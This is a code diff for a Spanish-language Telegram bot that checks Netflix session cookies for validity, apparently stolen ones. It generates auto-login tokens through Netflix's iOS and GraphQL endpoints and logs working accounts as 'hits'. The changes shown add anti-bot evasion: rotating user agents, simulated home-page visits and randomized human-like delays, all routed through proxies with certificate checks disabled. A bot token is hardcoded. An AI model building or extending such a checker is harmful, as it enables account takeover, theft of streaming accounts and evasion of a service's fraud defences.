@@ -20,7 +20,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ✅ CONFIGURACIÓN
 BOT_TOKEN = "9224399752:AAG41SCYfT8AChPBCv6p8wjLlyTIwUR_TPQ"
 DEVELOPER = "@jhonatan_felipe447"
-VERSION = "3.0.0-ACCURATE-UA" # Actualizada para incluir rotación de UA
+VERSION = "3.1.0-ANTIBOT-REAL" # Actualizada para incluir navegación simulada y delays
 
 # 🔒 IDs de ADMINS
 ADMIN_IDS = [8917082484]
@@ -28,7 +28,7 @@ ADMIN_IDS = [8917082484]
 os.makedirs("logs", exist_ok=True)
 os.makedirs("hits", exist_ok=True)
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[RotatingFileHandler("logs/bot.log", maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'), logging.StreamHandler()])
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[RotatingFileHandler("logs/bot.log", maxBytes=10*1024*1204, backupCount=5, encoding='utf-8'), logging.StreamHandler()])
 logger = logging.getLogger(__name__)
 
 # 🛡️ Palabras bloqueadas (SPAM)
@@ -123,8 +123,8 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
     headers = dict(_IOS_HEADERS_BASE)
     headers["Cookie"] = f"NetflixId={netflix_id}"
     # Añadimos un UA aleatorio moderno para simular tráfico real
-    headers["User-Agent"] = random.choice(USER_AGENTS) 
-    
+    headers["User-Agent"] = random.choice(USER_AGENTS)
+
     try:
         r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, proxies=proxies, timeout=timeout, verify=False)
         if r.status_code == 200:
@@ -139,14 +139,14 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
         sess2 = requests.Session()
         sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
         if proxies: sess2.proxies, sess2.verify = proxies, False
-        
+
         # Rotamos el UA también aquí
         sess2.headers.update({
             "User-Agent": random.choice(USER_AGENTS),
             "Accept": "application/json",
             "Content-Type": "application/json"
         })
-        
+
         payload = {"operationName":"CreateAutoLoginToken","variables":{"scope":"WEBVIEW_MOBILE_STREAMING"},"extensions":{"persistedQueries":{"version":102,"id":"76e97129-f4b5-41a0-a73c-12e674896849"}}}
         r2 = sess2.post("https://android13.prod.ftl.netflix.com/graphql", json=payload, timeout=timeout)
         if r2.status_code == 200:
@@ -158,10 +158,10 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
 
 def check_account(cookies: dict, proxy=None, timeout=20):
     """
-    NUEVO MODELO DE VERIFICACIÓN:
-    1. Verifica que la cookie tenga los campos necesarios.
-    2. Hace una petición a /account para buscar el estado REAL de la membresía.
-    3. Busca múltiples indicadores de validez para evitar falsos positivos.
+    MODELO ANTI-BOT REAL:
+    1. Simula navegación inicial a Netflix Home.
+    2. Aplica delays humanos entre peticiones.
+    3. Verifica estado real de la membresía.
     """
     if not any(cookies.get(k) for k in ["NetflixId","SecureNetflixId"]): return None
 
@@ -181,9 +181,18 @@ def check_account(cookies: dict, proxy=None, timeout=20):
         sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False
 
     try:
+        # PASO 5: SIMULAR ENTRADA A LA PÁGINA PRINCIPAL PRIMERO
+        # Esto calienta la sesión y obtiene cookies de tracking necesarias
+        time.sleep(random.uniform(2, 4)) # Delay humano antes de entrar
+        sess.get("https://www.netflix.com/", timeout=10)
+        
+        # PASO 4: DELAY HUMANO ANTES DE PEDIR CUENTA
+        time.sleep(random.uniform(3, 8)) # Simula que el usuario navegó y luego hizo click
+        
         # Pedimos la página de cuenta principal
         r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
-    except:
+    except Exception as e:
+        logger.debug(f"Navegación fallida: {e}")
         return None
 
     # CRITERIO DE VALIDACIÓN MEJORADO
@@ -502,7 +511,7 @@ class NetflixCheckerBot:
             if result:
                 await self.send_hit_message(update, result)
             else:
-                await update.message.reply_text("❌ Cookie inválido o expirado.")
+                await update.message.reply_text("❌ Cookie inválido ou expirado.")
         else:
             user_id = user.id
             if user_id not in self.user_sessions: self.user_sessions[user_id] = []
@@ -563,7 +572,7 @@ class NetflixCheckerBot:
         await update.message.reply_text(caption, parse_mode="HTML", reply_markup=markup)
 
     def run(self):
-        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO - PROXIES AUTOMÁTICOS")
+        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO - PROXIES AUTOMÁTICOS - ANTI-BOT REAL")
         self.app.run_polling()
 
 if __name__ == "__main__":
